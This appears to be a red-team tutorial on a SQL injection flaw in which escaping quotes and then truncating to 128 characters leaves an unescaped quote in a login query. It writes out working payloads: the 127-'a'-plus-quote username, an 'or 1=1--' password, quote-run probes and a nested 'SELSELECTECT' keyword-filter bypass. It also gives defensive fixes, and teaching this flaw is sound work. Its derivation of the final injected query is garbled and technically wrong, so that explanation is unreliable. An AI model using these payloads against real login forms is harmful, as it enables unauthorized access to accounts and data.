## 🧪 The Flawed Protection Logic

### ✅ Application’s SQLi protection logic (intended flow):

1. **Escape single quotes**: `'` → `''`
2. **Then truncate to 128 characters**

> But escaping can increase the string’s length.
> So if the result becomes **longer than 128**, truncation **chops off the end**, potentially leaving an **unescaped quote** dangling.

## 📘 The Login Query Format

Assuming the SQL query looks like this:

```sql
SELECT * FROM users 
WHERE username = '<USER_INPUT>' 
  AND password = '<PASSWORD_INPUT>'
```

That’s a classic vulnerable login structure.

---

## 💣 The Exploit Input

Let’s use **this username input**:

```sql
aaaaaaaa...aaaaa'       ← 127 'a's + a single quote
```

Let’s walk through what happens.

---

## 🧾 Step-by-Step Breakdown

### 🔹 Original input:

```plaintext
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

That’s **127 `a` characters + 1 `'`** = **128 total characters**

### 🔹 Step 1: Escaping applied

App doubles the single quote:

```plaintext
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa''
```

Now it’s **129 characters** because the `'` became `''`.

### 🔹 Step 2: Truncation to 128 characters

The app blindly chops off the extra character, so now it becomes:

```plaintext
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

→ That means the **second quote from the escape pair is gone**, turning `''` back into a **raw single quote `'`**.

> That’s the core issue: escaping was undone by truncation.

---

## 🧨 Now Add the Password Injection

Let’s say we input this as the **password**:

```sql
or 1=1--
```

### 🔹 The final query becomes:

```sql
SELECT * FROM users 
WHERE username = 'aaaaaaaa...aaaaa'' 
  AND password = 'or 1=1--'
```

But after escaping and truncation, username becomes:

```sql
'aaaaaaaa...aaaaa'    ← single unescaped quote ends early
```

So the resulting SQL becomes:

```sql
SELECT * FROM users 
WHERE username = 'aaaaaaaa...aaaaa' 
' AND password = 'or 1=1--'
```

That breaks the string context. The second single quote from the truncation **ends the username string** prematurely.

The rest of the query:

```sql
' AND password = 'or 1=1--'
```

...is now interpreted as **raw SQL**, not part of the `username` or `password` strings.

Thus:

```sql
password = 'or 1=1--'
```

This effectively becomes:

```sql
AND 'or 1=1--'
```

Depending on DB parsing, this can either:

* Cause syntax error (which can confirm vulnerability), or
* Be executed as logical bypass if the DB ignores the rest as a comment (after `--`).

---

### 🧠 Why This Works

The mistake? The **escaping happens first**, **then truncation**. So:

* Escaping makes safe input longer.
* Truncation can **cut off the escaping** and **reintroduce dangerous characters** into the query.

Think of it like this:

* Escape function: 🧹 → Clean things.
* Truncate function: ✂️ → Chop the head off... even the broom!

---

### ✅ Proper Way to Defend

If you were designing this:

* **Truncate before escaping**, not after.
* Better yet, **use parameterized queries** (prepared statements). Let the DB handle input safely.
* Never rely on manually escaping strings for SQL — it’s fragile and error-prone.

---

### 🔓 Other Real-World Scenarios

Same logic applies in:

* **XSS filtering**: If you escape HTML tags, then truncate, you might cut the escape and leave raw `<script>`.
* **Command injection**: Escaping dangerous shell characters, then truncating, can reopen the door for `;`, `&`, etc.

---

### 🔍 Detection Trick:

To test if truncation breaks escaping, try payloads like:

#### Payload A – Even number of quotes:

```
'''''''''''''''''''''''''''''''''''''''''''''''...
```

#### Payload B – Add `a` at start (odd number of quotes):

```
a''''''''''''''''''''''''''''''''''''''''''''''...
```

Observe:

* If **A** triggers an error and **B** doesn’t → escaping is probably fine.
* If **B** breaks things (e.g., throws SQL syntax error), truncation is likely messing up escaping.

---

## 🧪 Bonus Hack: Bypassing Keyword Filters

Suppose app strips `SELECT`. Try this:

```sql
SELSELECTECT
```

If filter removes inner "SELECT":

```
SELSELECTECT → SEL + [strip SELECT] + ECT → SELECT
```

🔥 You reconstructed the keyword from a filtered input.

### 🔐 Pro Tip for Red Teamers

Always think:

* **What is the order of operations?**
* **Can one security mechanism undo another?**
* **Are limits like length, encoding, or validation being used out of sync?**

---


## 🧠 Why Does This Work?

Because:

* The escaping made the quote safe (`'` → `''`)
* But truncation **cut that safety quote off**
* Which **invalidated the escaping**, reintroducing a lone quote
* And caused the input to *break out* of the original string context in SQL

---

## 🔒 Real-World Parallels

* This exact logic flaw has been spotted in:

  * **Old PHP/MySQL apps** using `addslashes()` + `substr()`
  * **Legacy Java apps** that do `input.replaceAll("'", "''")` before truncating
  * **Frontends doing JS validation, then backend PHP trimming** differently
